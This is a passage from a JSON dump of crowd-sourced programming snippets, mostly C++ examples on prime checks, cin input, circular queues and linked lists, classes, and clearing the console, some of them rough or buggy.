    "title": " check prime number c++",
    "description": "#include <iostream> using namespace std;  int main() {   int n, i;   bool isPrime = true;    cout << \"Enter a positive integer: \";   cin >> n;    for(i = 2; i <= n / 2; ++i)   {       if(n % i == 0)       {           isPrime = false;           break;       }   }   if (isPrime)       cout << \"This is a prime number\";   else       cout << \"This is not a prime number\";    return 0; }\n#include <iostream> using namespace std;  int main() {     int i, n;     bool isPrime = true;      cout << \"Enter a positive integer: \";     cin >> n;      // 0 and 1 are not prime numbers     if (n == 0 || n == 1) {         isPrime = false;     }     else {         for (i = 2; i <= n / 2; ++i) {             if (n % i == 0) {                 isPrime = false;                 break;             }         }     }     if (isPrime)         cout << n << \" is a prime number\";     else         cout << n << \" is not a prime number\";      return 0; } \n",
    "reg_date": "2021-10-12T11:39:05.000Z"
  },
  {
    "id": 1465,
    "keyword": null,
    "link": null,
    "title": " check uppercase c++",
    "description": "#include <algorithm>  any_of(str.begin(), str.end(), isupper)\nchar character = 'A'; //0100 0001 if((character & 0x20) == 0) { \t//is uppercase }\nif (isupper(str[i])) { \t// str[i] is uppercase }\n",
    "reg_date": "2021-10-12T11:39:05.000Z"
  },
  {
    "id": 1466,
    "keyword": null,
    "link": null,
    "title": " check variable type c++",
    "description": "#include <typeinfo> ... cout << typeid(variable).name() << endl;\n#include <typeinfo> #include <iostream>  class someClass { };  int main(int argc, char* argv[]) {     int a;     someClass b;     std::cout<<\"a is of type: \"<<typeid(a).name()<<std::endl;    \t// Output 'a is of type int'     std::cout<<\"b is of type: \"<<typeid(b).name()<<std::endl;    \t// Output 'b is of type someClass'     return 0;   \t// on the online compiler it comes as 'i' for int and 'c' for char }\n\tif (typeid(variable) == typeid(std::string)) { \t\tstd::cout << variable << \" is a string\" << std::endl; \t} \telse { \t\tstd::cout << variable << \" is not a string\" << std::endl; \t}//you can do this for every type \n",
    "reg_date": "2021-10-12T11:39:05.000Z"
  },
  {
    "id": 1467,
    "keyword": null,
    "link": null,
    "title": " check whether kth bit is 1",
    "description": "T = A & (1 << k)\n",
    "reg_date": "2021-10-12T11:39:05.000Z"
  },
  {
    "id": 1468,
    "keyword": null,
    "link": null,
    "title": " chess perft 5",
    "description": "r3k2r/pp1pp1pp/8/2pPPp/2P2P2/1P4P1/P6P/R3K2R w k f6 0 1 5\n",
    "reg_date": "2021-10-12T11:39:05.000Z"
  },
  {
    "id": 1469,
    "keyword": null,
    "link": null,
    "title": " choose endianness in cpp",
    "description": "#pragma scalar_storage_order big-endian //to store in big-endian-format #pragma scalar_storage_order little-endian //to store in little-endian #pragma scalar_storage_order default //to store it in your machines default endianness\n",
    "reg_date": "2021-10-12T11:39:05.000Z"
  },
  {
    "id": 1470,
    "keyword": null,
    "link": null,
    "title": " cicli informatica c++",
    "description": "Desh\n",
    "reg_date": "2021-10-12T11:39:05.000Z"
  },
  {
    "id": 1471,
    "keyword": null,
    "link": null,
    "title": " cin.fail()",
    "description": "#include <iostream> using namespace std;  int main() {     int number;     do{         cin >> number;         if(cin.fail())             cout << \"Not a number \" << endl;     }while(!cin.fail());     cout << \"number is \" << number << endl;     system(\"pause\");     return 0; }\n",
    "reg_date": "2021-10-12T11:39:05.000Z"
  },
  {
    "id": 1472,
    "keyword": null,
    "link": null,
    "title": " cin.get c++",
    "description": "cin.get(string_name, size);\n",
    "reg_date": "2021-10-12T11:39:06.000Z"
  },
  {
    "id": 1473,
    "keyword": null,
    "link": null,
    "title": " cin.getline",
    "description": "string z,s;  while (true)     {       cin>>z;       s+=z;       if(cin.peek()=='\\n')       break;     } ................................ \t\t\tOR\\/ ................................. string s; getline(cin,s);\n// extract to string #include <iostream> #include <string>  int main () {   std::string name;    std::cout << \"Please, enter your full name: \";   std::getline (std::cin,name);   std::cout << \"Hello, \" << name << \"!\\n\";    return 0; }\ncin>>n; cin.ignore(); cin.getline(cin,string,'\\n');\ngetline(cin, variable_name, '\\n'); \ngetline(cin, variable_name);\n",
    "reg_date": "2021-10-12T11:39:06.000Z"
  },
  {
    "id": 1474,
    "keyword": null,
    "link": null,
    "title": " cin.peek() c++",
    "description": "cin.peek() : Returns the next character in the input sequence.\n",
    "reg_date": "2021-10-12T11:39:06.000Z"
  },
  {
    "id": 1475,
    "keyword": null,
    "link": null,
    "title": " cin.tie c++",
    "description": "ios_base::sync_with_stdio(false); cin.tie(NULL); \n",
    "reg_date": "2021-10-12T11:39:06.000Z"
  },
  {
    "id": 1476,
    "keyword": null,
    "link": null,
    "title": " cin c++",
    "description": "// cin with strings #include <iostream> #include <string> using namespace std;  int main () {   string mystr;   cout << \"What's your name? \";   getline (cin, mystr);   cout << \"Hello \" << mystr << \".\\n\";   cout << \"What is your favorite team? \";   getline (cin, mystr);   cout << \"I like \" << mystr << \" too!\\n\";   return 0; }\n// i/o example  #include <iostream> using namespace std;  int main () {   int i;   cout << \"Please enter an integer value: \";   cin >> i;   cout << \"The value you entered is \" << i;   return 0; }\nint age; cin >> age;\nint x;  cout << \"hurry, give me a number!: \"; // Type a number and press enter cin >> x; // Get user input from the keyboard cout << \"you picked: \" << x << \" !\" // Display the input value  OR use: getline >> (cin, variable-name); instead of  cin >> x;    \nstd::cin >> variable_name; //It takes input from the user\nint age; cout << \"How old are you ?\" << endl; cin >> age;\n",
    "reg_date": "2021-10-12T11:39:06.000Z"
  },
  {
    "id": 1477,
    "keyword": null,
    "link": null,
    "title": " cin does not wait for input",
    "description": "/* cin stops taking input on whitespace encounter * so if you pass \"Prakhar Patel\" into cin>>name; * only \"Prakhar\" will be stored into name. * \"Patel\" will stay in stream and will come into next cin statement. */  getline(cin,fullname,'\\n'); //use this to capture input stream till \\n\n",
    "reg_date": "2021-10-12T11:39:06.000Z"
  },
  {
    "id": 1478,
    "keyword": null,
    "link": null,
    "title": " cin exceptions c++",
    "description": "cin.exceptions(ios_base::failbit);\n",
    "reg_date": "2021-10-12T11:39:07.000Z"
  },
  {
    "id": 1479,
    "keyword": null,
    "link": null,
    "title": " cin getline",
    "description": "string z,s;  while (true)     {       cin>>z;       s+=z;       if(cin.peek()=='\\n')       break;     } ................................ \t\t\tOR\\/ ................................. string s; getline(cin,s);\n// extract to string #include <iostream> #include <string>  int main () {   std::string name;    std::cout << \"Please, enter your full name: \";   std::getline (std::cin,name);   std::cout << \"Hello, \" << name << \"!\\n\";    return 0; }\ncin>>n; cin.ignore(); cin.getline(cin,string,'\\n');\ngetline(cin, variable_name);\ngetline(cin, variable_name, '\\n'); \n",
    "reg_date": "2021-10-12T11:39:07.000Z"
  },
  {
    "id": 1480,
    "keyword": null,
    "link": null,
    "title": " cin in c++",
    "description": "// cin with strings #include <iostream> #include <string> using namespace std;  int main () {   string mystr;   cout << \"What's your name? \";   getline (cin, mystr);   cout << \"Hello \" << mystr << \".\\n\";   cout << \"What is your favorite team? \";   getline (cin, mystr);   cout << \"I like \" << mystr << \" too!\\n\";   return 0; }\n// i/o example  #include <iostream> using namespace std;  int main () {   int i;   cout << \"Please enter an integer value: \";   cin >> i;   cout << \"The value you entered is \" << i;   return 0; }\nstd::cin >> variable_name; //It takes input from the user\n//Akbarali saqlagan C++ bo'yicha cin operatoriga ta'rif #include <iostream> using namespace std; int main (){   int a;   cout << \"Kattaroq sonni yozing: \";   cin >> a;   int b;   cout << \"Tepadaginga nisbatan kichik bo`lgan son(qiymatni) yozing: \";   cin >> b;   cout << \"Birinchi kiritgan soningizdan ikkinchi kiitgan soningiz \" << a-b << \" marta katta ekanligi ma'lum bo'ldi.\\n\";   return 0; }\ncout >> yourname; cin >> i;//VarInput(i);\ncin >> varName;\n",
    "reg_date": "2021-10-12T11:39:07.000Z"
  },
  {
    "id": 1481,
    "keyword": null,
    "link": null,
    "title": " cin statement c++",
    "description": "#include <iostream> using namespace std;  int main() {   string nameEntered;   cout << \"Enter your name: \\n\";   cin >> nameEntered;   cout << \"So, your name is \" << nameEntered;   return 0; }\n",
    "reg_date": "2021-10-12T11:39:07.000Z"
  },
  {
    "id": 1482,
    "keyword": null,
    "link": null,
    "title": " cin syntax in c++",
    "description": "cin >> varName;\ncin >> var1 >> var2 >> &hellip; >> varN;\n",
    "reg_date": "2021-10-12T11:39:07.000Z"
  },
  {
    "id": 1483,
    "keyword": null,
    "link": null,
    "title": " cin une énumération",
    "description": "#include <iostream> #include <stdexcept>  using namespace std;  enum X { A, B, C };  istream& operator>> ( istream& in, X& x ) {   int val;    if ( in>> val ) {     switch ( val ) {     case A: case B: case C:       x = X(val); break;     default:       throw out_of_range ( \"Invalid value for type X\" );     }   }    return in; }  int main() {   X x;    try {     cin>> x;     cout<< x <<endl;   } catch ( out_of_range& ex ) {     cerr<< ex.what() <<endl;   } }\n",
    "reg_date": "2021-10-12T11:39:07.000Z"
  },
  {
    "id": 1484,
    "keyword": null,
    "link": null,
    "title": " circular array",
    "description": "A, B, C, D, E, F, G, and H are sitting in a circle facing the center. E is second to the left of A and third to the right of G. D is second to the right of H, who is to the immediate right of E. B is third to the right of F. \n",
    "reg_date": "2021-10-12T11:39:07.000Z"
  },
  {
    "id": 1485,
    "keyword": null,
    "link": null,
    "title": " circular linked list insertion",
    "description": "#include <stdio.h> #include <string.h> #include <stdlib.h> #include <stdbool.h>  struct node {    int data;    int key; \t    struct node *next; };  struct node *head = NULL; struct node *current = NULL;  bool isEmpty() {    return head == NULL; }  int length() {    int length = 0;     //if list is empty    if(head == NULL) {       return 0;    }     current = head->next;     while(current != head) {       length++;       current = current->next;       } \t    return length; }  //insert link at the first location void insertFirst(int key, int data) {     //create a link    struct node *link = (struct node*) malloc(sizeof(struct node));    link->key = key;    link->data = data; \t    if (isEmpty()) {       head = link;       head->next = head;    } else {       //point it to old first node       link->next = head; \t\t       //point first to new first node       head = link;    }     }  //delete first item struct node * deleteFirst() {     //save reference to first link    struct node *tempLink = head; \t    if(head->next == head) {         head = NULL;       return tempLink;    }          //mark next to first link as first     head = head->next; \t    //return the deleted link    return tempLink; }  //display the list void printList() {     struct node *ptr = head;    printf(\"\\n[ \"); \t    //start from the beginning    if(head != NULL) { \t       while(ptr->next != ptr) {               printf(\"(%d,%d) \",ptr->key,ptr->data);          ptr = ptr->next;       }    } \t    printf(\" ]\"); }  void main() {    insertFirst(1,10);    insertFirst(2,20);    insertFirst(3,30);    insertFirst(4,1);    insertFirst(5,40);    insertFirst(6,56);      printf(\"Original List: \");  \t    //print list    printList();     while(!isEmpty()) {                   struct node *temp = deleteFirst();       printf(\"\\nDeleted value:\");         printf(\"(%d,%d) \",temp->key,temp->data);    }    \t    printf(\"\\nList after deleting all items: \");    printList();    }\n#include <iostream>  using namespace std; class node { public:     int data;     node*next; }; node*head=NULL; void insert_begin(int a) {     node*temp=new node;     temp->data=a;     if(head==NULL)     {         temp->next=temp;         head=temp;     }     else     {         node*ptr=new node;         ptr=head;         while(ptr->next!=head)         {            ptr=ptr->next;         }         ptr->next=temp;         temp->next=head;         head=temp;      } } void insert_end(int a) {     node*temp=new node;     temp->data=a;     if(head==NULL)     {         temp->next=head;         head=temp;     }     else     {         node*ptr=new node;         ptr=head;         while(ptr->next!=head)         {             ptr=ptr->next;         }         ptr->next=temp;         temp->next=head;     } } void printf() {     node*temp=new node;     temp=head;     do     {         cout<<temp->data<<\" \";         temp=temp->next;     }while(temp!=head);      cout<<endl; }  int main() {     while(1)     {         cout<<\"1-insert at begin\"<<endl<<\"2-insert at end\"<<endl<<\"3-exit\"<<endl;         int n;         cout<<\"enter your choice:\"<<endl;         cin>>n;         cout<<\"enter thee value you want to insert:\"<<endl;         int val;         cin>>val;         switch(n)         {         case 1:             {                 cout<<\"enter thee value you want to insert:\"<<endl;                   int val;                   cin>>val;                 insert_begin(val);                 printf();                 break;             }         case 2:             {                 cout<<\"enter thee value you want to insert:\"<<endl;                 int val;                 cin>>val;                 insert_end(val);                 printf();                 break;             }         case 3:              {                 exit(0);             }         default:             {                 cout<<\"invalid choice :\"<<endl;             }         }     }     return 0; } \n",
    "reg_date": "2021-10-12T11:39:07.000Z"
  },
  {
    "id": 1486,
    "keyword": null,
    "link": null,
    "title": " circular quene",
    "description": "// Circular Queue implementation in C++  #include <iostream> #define SIZE 5 /* Size of Circular Queue */  using namespace std;  class Queue {    private:   int items[SIZE], front, rear;     public:   Queue() {     front = -1;     rear = -1;   }   // Check if the queue is full   bool isFull() {     if (front == 0 && rear == SIZE - 1) {       return true;     }     if (front == rear + 1) {       return true;     }     return false;   }   // Check if the queue is empty   bool isEmpty() {     if (front == -1)       return true;     else       return false;   }   // Adding an element   void enQueue(int element) {     if (isFull()) {       cout << \"Queue is full\";     } else {       if (front == -1) front = 0;       rear = (rear + 1) % SIZE;       items[rear] = element;       cout << endl          << \"Inserted \" << element << endl;     }   }   // Removing an element   int deQueue() {     int element;     if (isEmpty()) {       cout << \"Queue is empty\" << endl;       return (-1);     } else {       element = items[front];       if (front == rear) {         front = -1;         rear = -1;       }       // Q has only one element,       // so we reset the queue after deleting it.       else {         front = (front + 1) % SIZE;       }       return (element);     }   }    void display() {     // Function to display status of Circular Queue     int i;     if (isEmpty()) {       cout << endl          << \"Empty Queue\" << endl;     } else {       cout << \"Front -> \" << front;       cout << endl          << \"Items -> \";       for (i = front; i != rear; i = (i + 1) % SIZE)         cout << items[i];       cout << items[i];       cout << endl          << \"Rear -> \" << rear;     }   } };  int main() {   Queue q;    // Fails because front = -1   q.deQueue();    q.enQueue(1);   q.enQueue(2);   q.enQueue(3);   q.enQueue(4);   q.enQueue(5);    // Fails to enqueue because front == 0 && rear == SIZE - 1   q.enQueue(6);    q.display();    int elem = q.deQueue();    if (elem != -1)     cout << endl        << \"Deleted Element is \" << elem;    q.display();    q.enQueue(7);    q.display();    // Fails to enqueue because front == rear + 1   q.enQueue(8);    return 0; }\n",
    "reg_date": "2021-10-12T11:39:07.000Z"
  },
  {
    "id": 1487,
    "keyword": null,
    "link": null,
    "title": " circular queue",
    "description": "// Circular Queue implementation in C++  #include <iostream> #define SIZE 5 /* Size of Circular Queue */  using namespace std;  class Queue {    private:   int items[SIZE], front, rear;     public:   Queue() {     front = -1;     rear = -1;   }   // Check if the queue is full   bool isFull() {     if (front == 0 && rear == SIZE - 1) {       return true;     }     if (front == rear + 1) {       return true;     }     return false;   }   // Check if the queue is empty   bool isEmpty() {     if (front == -1)       return true;     else       return false;   }   // Adding an element   void enQueue(int element) {     if (isFull()) {       cout << \"Queue is full\";     } else {       if (front == -1) front = 0;       rear = (rear + 1) % SIZE;       items[rear] = element;       cout << endl          << \"Inserted \" << element << endl;     }   }   // Removing an element   int deQueue() {     int element;     if (isEmpty()) {       cout << \"Queue is empty\" << endl;       return (-1);     } else {       element = items[front];       if (front == rear) {         front = -1;         rear = -1;       }       // Q has only one element,       // so we reset the queue after deleting it.       else {         front = (front + 1) % SIZE;       }       return (element);     }   }    void display() {     // Function to display status of Circular Queue     int i;     if (isEmpty()) {       cout << endl          << \"Empty Queue\" << endl;     } else {       cout << \"Front -> \" << front;       cout << endl          << \"Items -> \";       for (i = front; i != rear; i = (i + 1) % SIZE)         cout << items[i];       cout << items[i];       cout << endl          << \"Rear -> \" << rear;     }   } };  int main() {   Queue q;    // Fails because front = -1   q.deQueue();    q.enQueue(1);   q.enQueue(2);   q.enQueue(3);   q.enQueue(4);   q.enQueue(5);    // Fails to enqueue because front == 0 && rear == SIZE - 1   q.enQueue(6);    q.display();    int elem = q.deQueue();    if (elem != -1)     cout << endl        << \"Deleted Element is \" << elem;    q.display();    q.enQueue(7);    q.display();    // Fails to enqueue because front == rear + 1   q.enQueue(8);    return 0; }\n",
    "reg_date": "2021-10-12T11:39:08.000Z"
  },
  {
    "id": 1488,
    "keyword": null,
    "link": null,
    "title": " circular queue using linked list in c++",
    "description": "#include<iostream>  #define SIZE 100  using namespace std;  class node { public:     node()     {         next = NULL;     }   int data;   node *next; }*front=NULL,*rear=NULL,*n,*temp,*temp1;  class cqueue { public:     void insertion();     void deletion();     void display(); };  int main() {     cqueue cqobj;   int ch;   do   {      cout<<\"\\n\\n\\tMain Menu\";      cout<<\"\\n##########################\";      cout<<\"\\n1. Insert\\n2. Delete\\n3. Display\\n4. Exit\\n\\nEnter Your Choice: \";      cin>>ch;      switch(ch)      {         case 1:           cqobj.insertion();           cqobj.display();           break;         case 2:           cqobj.deletion();           break;         case 3:           cqobj.display();           break;         case 4:           break;         default:           cout<<\"\\n\\nWrong Choice!!! Try Again.\";      }   }while(ch!=4);   return 0; }  void cqueue::insertion() {   n=new node[sizeof(node)];   cout<<\"\\nEnter the Element: \";   cin>>n->data;   if(front==NULL)   {       front=n;   }   else   {       rear->next=n;   }   rear=n;   rear->next=front; }  void cqueue::deletion() {   int x;   temp=front;   if(front==NULL)   {       cout<<\"\\nCircular Queue Empty!!!\";   }   else   {      if(front==rear)      {        x=front->data;        delete(temp);        front=NULL;        rear=NULL;      }      else      {         x=temp->data;         front=front->next;         rear->next=front;         delete(temp);      }      cout<<\"\\nElement \"<<x<<\" is Deleted\";      display();   } }  void cqueue::display() {   temp=front;   temp1=NULL;   if(front==NULL)   {     cout<<\"\\n\\nCircular Queue Empty!!!\";   }   else   {     cout<<\"\\n\\nCircular Queue Elements are:\\n\\n\";     while(temp!=temp1)     {        cout<<temp->data<<\"  \";        temp=temp->next;        temp1=front;     }   } }\n",
    "reg_date": "2021-10-12T11:39:08.000Z"
  },
  {
    "id": 1489,
    "keyword": null,
    "link": null,
    "title": " clamp in c++",
    "description": "#include <cstdint> #include <algorithm> #include <iostream> #include <iomanip>   int main() {     std::cout << \" raw   clamped to int8_t   clamped to uint8_t\\n\";     for(int const v: {-129, -128, -1, 0, 42, 127, 128, 255, 256}) {         std::cout << std::setw(04) << v                   << std::setw(20) << std::clamp(v, INT8_MIN, INT8_MAX)                   << std::setw(21) << std::clamp(v, 0, UINT8_MAX) << '\\n';     } }\n",
    "reg_date": "2021-10-12T11:39:08.000Z"
  },
  {
    "id": 1490,
    "keyword": null,
    "link": null,
    "title": " class",
    "description": "Class is a blueprint or template which you can create as many objects as you  like. Object is a member or instance of a class. Class is declared using class keyword, Object is created through new keyword mainly. A class is a template for objects. A class defines  object properties including a valid range of values, and a default value.  A class also describes object behavior.\n.ThisIsAClassName { \tcolor: blue; }\n<p class=\"ThisIsAClassName\">Class</p>\n/* Any Element With Class Title */ .title { }  /* ? */ #nav { }  /* ? */ div { }  /* ? */ h2 { }\n#include <iostream> #include <utility>   template<class T, class U> auto add(T t, U u) { return t + u; } // the return type is the type of operator+(T, U)   // perfect forwarding of a function call must use decltype(auto) // in case the function it calls returns by reference template<class F, class... Args> decltype(auto) PerfectForward(F fun, Args&&... args)  {      return fun(std::forward<Args>(args)...);  }   template<auto n> // C++17 auto parameter declaration auto f() -> std::pair<decltype(n), decltype(n)> // auto can't deduce from brace-init-list {     return {n, n}; }   int main() {     auto a = 1 + 2;          // type of a is int     auto b = add(1, 1.2);    // type of b is double     static_assert(std::is_same_v<decltype(a), int>);     static_assert(std::is_same_v<decltype(b), double>);       auto c0 = a;             // type of c0 is int, holding a copy of a     decltype(auto) c1 = a;   // type of c1 is int, holding a copy of a     decltype(auto) c2 = (a); // type of c2 is int&, an alias of a     std::cout << \"a, before modification through c2 = \" << a << '\\n';     ++c2;     std::cout << \"a,  after modification through c2 = \" << a << '\\n';       auto [v, w] = f<0>(); //structured binding declaration       auto d = {1, 2}; // OK: type of d is std::initializer_list<int>     auto n = {5};    // OK: type of n is std::initializer_list<int> //  auto e{1, 2};    // Error as of DR n3922, std::initializer_list<int> before     auto m{5};       // OK: type of m is int as of DR n3922, initializer_list<int> before //  decltype(auto) z = { 1, 2 } // Error: {1, 2} is not an expression       // auto is commonly used for unnamed types such as the types of lambda expressions     auto lambda = [](int x) { return x + 3; };   //  auto int x; // valid C++98, error as of C++11 //  auto x;     // valid C, error in C++ }\n.wp-block-code { \tborder: 0; \tpadding: 0; }  .wp-block-code > div { \toverflow: auto; }  .shcb-language { \tborder: 0; \tclip: rect(1px, 1px, 1px, 1px); \t-webkit-clip-path: inset(50%); \tclip-path: inset(50%); \theight: 1px; \tmargin: -1px; \toverflow: hidden; \tpadding: 0; \tposition: absolute; \twidth: 1px; \tword-wrap: normal; \tword-break: normal; }  .hljs { \tbox-sizing: border-box; }  .hljs.shcb-code-table { \tdisplay: table; \twidth: 100%; }  .hljs.shcb-code-table > .shcb-loc { \tcolor: inherit; \tdisplay: table-row; \twidth: 100%; }  .hljs.shcb-code-table .shcb-loc > span { \tdisplay: table-cell; }  .wp-block-code code.hljs:not(.shcb-wrap-lines) { \twhite-space: pre; }  .wp-block-code code.hljs.shcb-wrap-lines { \twhite-space: pre-wrap; }  .hljs.shcb-line-numbers { \tborder-spacing: 0; \tcounter-reset: line; }  .hljs.shcb-line-numbers > .shcb-loc { \tcounter-increment: line; }  .hljs.shcb-line-numbers .shcb-loc > span { \tpadding-left: 0.75em; }  .hljs.shcb-line-numbers .shcb-loc::before { \tborder-right: 1px solid #ddd; \tcontent: counter(line); \tdisplay: table-cell; \tpadding: 0 0.75em; \ttext-align: right; \t-webkit-user-select: none; \t-moz-user-select: none; \t-ms-user-select: none; \tuser-select: none; \twhite-space: nowrap; \twidth: 1%; }function Person(name) {     this.name = name; }  Person.prototype.getName = function () {     return this.name; };  var john = new Person(\"John Doe\"); console.log(john.getName());Code language: JavaScript (javascript)\n",
    "reg_date": "2021-10-12T11:39:08.000Z"
  },
  {
    "id": 1491,
    "keyword": null,
    "link": null,
    "title": " class cpp",
    "description": "class Object { public: \tint var; \tvoid setVar(int n) { \t\tvar = n; \t} \tint getNum() { \t\treturn var; \t} };  int main() { \tObject obj; \tobj.setVar(13); \tstd::cout << obj.getNum() << std::endl; \treturn 0; }\nclass Rectangle  { \tint width, height; public: \tvoid set_values (int,int);     int area() {return width*height;} };  void Rectangle::set_values (int x, int y) { \twidth = x; \theight = y; }\nclass Exemple {   private:   \t/* data */   public:   \tExemple(); //Constructor   \t~Exemple(); //Destructor };\nclass Rectangle {     int width, height;   public:     void set_values (int,int);     int area (void); } rect;\nclass Name {   private:   \tint data;      public:        // Constructor   \tName() { \t\t// Code           }   \tint id;   \tvoid fun1(int a) {         // Some instructions here      }  \t  }\nclass SampleClass {     int a; public:     SampleClass(int v)     {         a=v;     }     int RetVal()     {         return a;     } };\n",
    "reg_date": "2021-10-12T11:39:08.000Z"
  },
  {
    "id": 1492,
    "keyword": null,
    "link": null,
    "title": " class declaration in header file c++ example",
    "description": "class Date { private:     int m_year;     int m_month;     int m_day;  public:     Date(int year, int month, int day)     {         setDate(year, month, day);     }      void setDate(int year, int month, int day)     {         m_year = year;         m_month = month;         m_day = day;     }      int getYear() { return m_year; }     int getMonth() { return m_month; }     int getDay()  { return m_day; } }; \n",
    "reg_date": "2021-10-12T11:39:08.000Z"
  },
  {
    "id": 1493,
    "keyword": null,
    "link": null,
    "title": " class in c++",
    "description": "public class Car {       // fields     public bool isDriving = false;          // constructor     public Car( string make )     {         Make = make;     } \t     // properties     private string _make = string.Empty;     public string Make     {         get { return _make; }         set { _make = value; }      }          // methods     public void drive()     {         if( isDriving )         { \t\t\t// Car is already moving         }         else \t\t{             // start driving the car             isDriving = true;     \t}             }      public void stop()     { \t\tif( isDriving ) \t\t{ \t\t\t// stop the car  \t\t\tisDriving = false; \t\t}         else         { \t\t\t// car is already not moving         }             }       }  // --- // An example of using this class in a console app  using System; \t\t\t\t\t public class Program { \tpublic static void Main() \t{\t\t         // construct a new class of type Car and set the Make       \t// property to \"VW\" using the constructor. \t\tCar newCar = new Car( \"VW\" ); \t\t       \t// display the make of our new car \t\tConsole.WriteLine( newCar.Make ); \t\t       \t// call the drive method of the car class \t\tnewCar.drive();\t\t \t\t       \t// display the value of the isDriving property to \t\tConsole.WriteLine( newCar.isDriving ); \t\t       \t// call the stop method of the car class \t\tnewCar.stop(); \t\t       \t// display the value of the isDriving property \t\tConsole.WriteLine( newCar.isDriving ); \t} }  // the class  public class Car {       // fields     public bool isDriving = false;          // constructor w     public Car( string make )     {         Make = make;     } \t     // properties     private string _make = string.Empty;     public string Make     {         get { return _make; }         set { _make = value; }      }          // methods     public void drive()     {         if( isDriving )         {         \t\t// Car is already moving         }         else \t\t{             // start driving the car             isDriving = true;     \t}             }      public void stop()     { \t\tif( isDriving ) \t\t{ \t\t\t// stop the car  \t\t\tisDriving = false; \t\t}         else         { \t\t\t// car is already not moving         }             }       }\nclass Rectangle  { \tint width, height; public: \tvoid set_values (int,int);     int area() {return width*height;} };  void Rectangle::set_values (int x, int y) { \twidth = x; \theight = y; }\nclass Exemple {   private:   \t/* data */   public:   \tExemple(); //Constructor   \t~Exemple(); //Destructor };\nclass Rectangle {     int width, height;   public:     void set_values (int,int);     int area (void); } rect;\nclass Name {   private:   \tint data;      public:        // Constructor   \tName() { \t\t// Code           }   \tint id;   \tvoid fun1(int a) {         // Some instructions here      }  \t  }\npublic abstract class GraphicObject {     abstract void draw(); }\n",
    "reg_date": "2021-10-12T11:39:08.000Z"
  },
  {
    "id": 1494,
    "keyword": null,
    "link": null,
    "title": " class is replace by structure",
    "description": "1) Members of a class are private by default and members of a struct are public by default. For example program 1 fails in compilation and program 2 works fine.  / Program 1  #include <stdio.h>     class Test {      int x; // x is private  };  int main()  {    Test t;    t.x = 20; // compiler error because x is private    getchar();    return 0;  }   // Program 2  #include <stdio.h>     struct Test {      int x; // x is public  };  int main()  {    Test t;    t.x = 20; // works fine because x is public    getchar();    return 0;  } \n",
    "reg_date": "2021-10-12T11:39:08.000Z"
  },
  {
    "id": 1495,
    "keyword": null,
    "link": null,
    "title": " classes c++",
    "description": "class Rectangle {     int width, height;   public:     void set_values (int,int);     int area (void); } rect;\n",
    "reg_date": "2021-10-12T11:39:08.000Z"
  },
  {
    "id": 1496,
    "keyword": null,
    "link": null,
    "title": " classes in header file c++ example",
    "description": "//headers  #ifndef TOOLS_hpp  #define TOOLS_hpp #include<vector>  #include<iostream> #include<fstream> #include<string> using std::ifstream; using std::cout;  using std::cin; using std::endl; using std::cerr; using std::vector; using std::string; // functions prototypes  inline vector<int> merge(const vector<int>&a,const vector<int>& b);//merge function prototype with Formal Parameters  std::vector<int> sort(size_t start, size_t length, const std::vector<int>& vec);//sort function prototype with formal parameters  #endif \nclass Date { private:     int m_year;     int m_month;     int m_day;  public:     Date(int year, int month, int day)     {         setDate(year, month, day);     }      void setDate(int year, int month, int day)     {         m_year = year;         m_month = month;         m_day = day;     }      int getYear() { return m_year; }     int getMonth() { return m_month; }     int getDay()  { return m_day; } }; \n",
    "reg_date": "2021-10-12T11:39:08.000Z"
  },
  {
    "id": 1497,
    "keyword": null,
    "link": null,
    "title": " clean list widget qt",
    "description": "void QListWidget::clear()\n",
    "reg_date": "2021-10-12T11:39:09.000Z"
  },
  {
    "id": 1498,
    "keyword": null,
    "link": null,
    "title": " clear console c++",
    "description": "#include <Windows.h>  int main() { \t//print stuff      \tsystem(\"cls\"); // clear console }\nsystem (\"CLS\");\n#ifdef __cplusplus__   #include <cstdlib> #else   #include <stdlib.h> #endif  if (system(\"CLS\")) system(\"clear\");\ni swear if you write system(\"cls\"); one more time you're ugly\n",
    "reg_date": "2021-10-12T11:39:09.000Z"
  },
  {
    "id": 1499,
    "keyword": null,
    "link": null,
    "title": " clear file before writing c++",
    "description": "std::ofstream ofs; ofs.open(\"test.txt\", std::ofstream::out | std::ofstream::trunc); ofs.close();\n",
    "reg_date": "2021-10-12T11:39:09.000Z"
  },
  {
    "id": 1500,
    "keyword": null,
    "link": null,
    "title": " clear qlayout",
    "description": "for(int i=0; i<my_layout->count(); i++){ \tdelete my_layout->itemAt(i); }\n",
    "reg_date": "2021-10-12T11:39:09.000Z"
  },
  {
    "id": 1501,
    "keyword": null,
    "link": null,
    "title": " clear screen in c++",
    "description": "enter code here void clrscr() {   system(\"cls\"); } \n#ifdef __cplusplus__   #include <cstdlib> #else   #include <stdlib.h> #endif  if (system(\"CLS\")) system(\"clear\");\n",
    "reg_date": "2021-10-12T11:39:09.000Z"
  },
  {
    "id": 1502,
    "keyword": null,
    "link": null,
    "title": " clear vs erase vector c++",
    "description": "//Syntax vectorname.clear() vectorname.erase(startingposition, endingposition)    clear() removes all the elements from a vector container, thus making its  size 0. All the elements of the vector are removed using clear() function.     erase() function, on the other hand, is used to remove specific elements from  the container or a range of elements from the container, thus reducing its size by the number of elements removed.   \n",
    "reg_date": "2021-10-12T11:39:09.000Z"
  },
  {
    "id": 1503,
    "keyword": null,
    "link": null,
    "title": " clock gettime example",
    "description": "/*  * This program calculates the time required to  * execute the program specified as its first argument.  * The time is printed in seconds, on standard out.  */ #include <stdio.h> #include <unistd.h> #include <stdlib.h> #include <time.h>  #define BILLION  1000000000L;  int main( int argc, char **argv )   {     struct timespec start, stop;     double accum;      if( clock_gettime( CLOCK_REALTIME, &start) == -1 ) {       perror( \"clock gettime\" );       exit( EXIT_FAILURE );     }      system( argv[1] );      if( clock_gettime( CLOCK_REALTIME, &stop) == -1 ) {       perror( \"clock gettime\" );       exit( EXIT_FAILURE );     }      accum = ( stop.tv_sec - start.tv_sec )           + ( stop.tv_nsec - start.tv_nsec )             / BILLION;     printf( \"%lf\\n\", accum );     return( EXIT_SUCCESS );   } Clas\n",
    "reg_date": "2021-10-12T11:39:10.000Z"
  },
  {
    "id": 1504,
    "keyword": null,
    "link": null,
    "title": " close a filestream c++",
    "description": "// fstream::open / fstream::close #include <fstream>      // std::fstream  int main () {    // instantiating the file stream   std::fstream fs;      // opening the file with the fstream   fs.open (\"test.txt\", std::fstream::in | std::fstream::out | std::fstream::app);    fs << \" more lorem ipsum\";    // closing the file   fs.close();    return 0; }\n",
    "reg_date": "2021-10-12T11:39:10.000Z"
  },
  {
    "id": 1505,
    "keyword": null,
    "link": null,
    "title": " closing a ifstream file c++",
